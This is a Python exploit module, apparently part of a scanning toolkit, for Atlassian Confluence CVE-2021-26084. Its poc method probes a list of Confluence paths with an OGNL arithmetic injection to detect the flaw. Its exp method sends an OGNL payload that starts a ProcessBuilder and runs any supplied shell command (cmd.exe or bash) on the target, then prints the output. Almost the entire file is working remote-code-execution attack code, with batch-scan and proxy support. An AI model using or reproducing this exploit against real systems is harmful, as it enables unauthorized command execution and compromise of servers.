#!/user/bin/env python3
# -*- coding: utf-8 -*-
import random
import requests
import urllib3
from bs4 import BeautifulSoup
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Cve_2021_26084_2:
    def poc(self,host):
        paths = ['/pages/createpage-entervariables.action?SpaceKey=x', '/pages/createpage-entervariables.action', '/confluence/pages/createpage-entervariables.action?SpaceKey=x', '/confluence/pages/createpage-entervariables.action', '/wiki/pages/createpage-entervariables.action?SpaceKey=x', '/wiki/pages/createpage-entervariables.action', '/pages/doenterpagevariables.action', '/pages/createpage.action?spaceKey=myproj', '/pages/templates2/viewpagetemplate.action', '/pages/createpage-entervariables.action', '/template/custom/content-editor', '/templates/editor-preload-container', '/users/user-dark-features']
        for path in paths:
            url = host + path
            headers = {
                "User-Agent": self.headers,
                "Content-Type": "application/x-www-form-urlencoded"}
            num1 = random.randint(100, 10000)
            num2 = random.randint(100, 10000)
            sum = num1 * num2
            params = {
            "queryString": "aaaa\\u0027+{" + str(num1) + "*" + str(num2) + "}+\\u0027bbb"}
            try:
                res = requests.post(url, headers=headers, data=params,
                                    timeout=6, verify=self.ssl, proxies=self.proxy)
                if str(sum) in res.text:
                    OutPrintInfoSuc("Atlassian", f"{host}{path} is vulnerable!")
                    if self.batch:
                        OutPutFile("atlassian_2021_26084.txt",f"{host}{path} is vulnerable!")
                    return path
                else:
                    continue
            except:
                continue
        if not self.batch:
            OutPrintInfo("Atlassian", f"{host} is not vulnerable!")
        return 0

    def exp(self,host, command, path):
        url = host + path
        headers = {
            "User-Agent": self.headers,
            "Content-Type": "application/x-www-form-urlencoded"}
        params = {
            "queryString": "aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}

        res = requests.post(url, headers=headers, data=params,
                            timeout=6, verify=self.ssl, proxies=self.proxy).text
        soup = BeautifulSoup(res, "html5lib")
        # content = soup.find(method="POST").find_all('input')[1]["value"]
        content = soup.find('input', attrs={'name': 'queryString', 'type': 'hidden'})[
            'value']

        print(content.replace('aaaaaaaa[', '').replace('\n]', ''))


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        self.headers = target["header"]
        cmd = target["cmd"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Atlassian", '开始执行Atlassian Confluence CVE-2021-26084漏洞...')
        path = self.poc(url)
        if not self.batch:
            if path != 0:
                self.exp(url, cmd, path)
        if not self.batch:
            OutPrintInfo("Atlassian", 'Atlassian Confluence CVE-2021-26084漏洞检测结束')


